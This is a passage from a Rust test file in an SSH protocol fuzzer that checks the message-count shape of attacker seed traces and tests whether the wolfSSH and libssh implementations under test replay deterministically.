        let client = AgentName::first();
        let server = client.next();
        for (trace, name, outputs) in [
            (seed_client_attacker_pubkey_b(server), "pubkey_b", 7),
            (
                seed_client_attacker_impersonate_a_with_b(server),
                "impersonate_a_with_b",
                5,
            ),
            (
                seed_client_attacker_unauthorized_key_c(server),
                "unauthorized_key_c",
                5,
            ),
        ] {
            assert_eq!(io_counts(&trace), (8, outputs), "seed {name} shape");
            assert_eq!(trace.descriptors.len(), 1, "seed {name} descriptor count");
        }
    }

    // The rekey seed keeps its 9-input re-KEX shape after the mutable-KEXINIT
    // enrichment, and the channel-data seed keeps its 12 inputs.
    #[test]
    fn enriched_seeds_shape() {
        let client = AgentName::first();
        let server = client.next();
        assert_eq!(io_counts(&seed_client_attacker_rekey(server)), (9, 7));
        assert_eq!(
            io_counts(&seed_client_attacker_channel_data(server)),
            (12, 7)
        );
    }

    // The server-attacker seed (attacker plays the server; the PUT is the CLIENT,
    // so this fuzzes the client-side parsers) builds and carries the full server
    // flight: banner + kexinit + kexdh-reply + newkeys + svc-accept + auth-success
    // = 6 inputs, each answered by the client (7 outputs with its opening flight),
    // on a single CLIENT agent.
    #[test]
    fn server_attacker_seed_shape() {
        let client = AgentName::first();
        let trace = seed_server_attacker_full_aesgcm(client);
        assert_eq!(io_counts(&trace), (6, 7), "server-attacker shape");
        assert_eq!(
            trace.descriptors.len(),
            1,
            "server-attacker descriptor count"
        );
        assert_eq!(
            trace.descriptors[0].protocol_config.typ,
            AgentType::Client,
            "server-attacker PUT must be the CLIENT role"
        );
    }

    /// PUT determinism (mirrors TLS `test_attacker_full_det_recreate`): the same
    /// trace, replayed against the same PUT in the same process, must produce
    /// byte-identical contexts across runs even with a wall-clock gap between them.
    /// Determinism is the precondition the whole differential method rests on: a
    /// nondeterministic PUT would manufacture spurious cross-stack "differences" run
    /// to run.
    ///
    /// Both PUTs and both roles are covered. wolfSSL draws from the harness's
    /// CUSTOM_RAND_GENERATE_SEED stream, rewound at every agent create. libssh draws
    /// from OpenSSL through the harness's custom RAND_METHOD (harness/libssh/src/rng.c),
    /// reset to its default seed by `determinism_reseed_all_factories` before every
    /// execution. (An earlier note here said libssh was nondeterministic in-process;
    /// re-measured 2026-09-23 it is deterministic in both roles. The single-PUT vs
    /// differential mismatch seen in triage was a CONFIG difference, the missing
    /// uniformisation, not randomness; see `display-execute --uniformise`.)
    #[cfg(any(has_put = "wolfssh150", has_put = "libssh0114"))]
    fn assert_put_deterministic(put: &str, trace: Trace<SshProtocolTypes>) {
        use std::thread;
        use std::time::Duration;

        use puffin::execution::{Runner, TraceRunner};
        use puffin::trace::Spawner;

        use crate::put_registry::ssh_registry;

        let mut registry = ssh_registry();
        registry
            .set_default_factory(put)
            .unwrap_or_else(|e| panic!("PUT {put} not registered: {e}"));
        let spawner = Spawner::new(registry.clone());
        let runner = Runner::new(registry, spawner);

        let _exec = put_exec_lock();
        let ctx_1 = (&runner).execute(&trace, &mut 0);
        // A wall-clock gap between executions surfaces any hidden time dependence.
        thread::sleep(Duration::from_secs(1));
        for i in 0..20 {
            let ctx_2 = (&runner).execute(&trace, &mut 0);
            assert!(
                ctx_1 == ctx_2,
                "PUT {put} executed nondeterministically at attempt {i}"
            );
        }
    }

    #[cfg(has_put = "wolfssh150")]
    #[test]
    fn wolfssh_put_is_deterministic() {
        let a = AgentName::first();
        assert_put_deterministic("wolfssh150", seed_client_attacker_full_aesgcm(a)); // server role
        assert_put_deterministic("wolfssh150", seed_server_attacker_full_aesgcm(a)); // client role
    }

    #[cfg(has_put = "libssh0114")]
    #[test]
    fn libssh_put_is_deterministic() {
        let a = AgentName::first();
        assert_put_deterministic("libssh0114", seed_client_attacker_full_aesgcm(a)); // server role
        assert_put_deterministic("libssh0114", seed_server_attacker_full_aesgcm(a)); // client role
    }
}
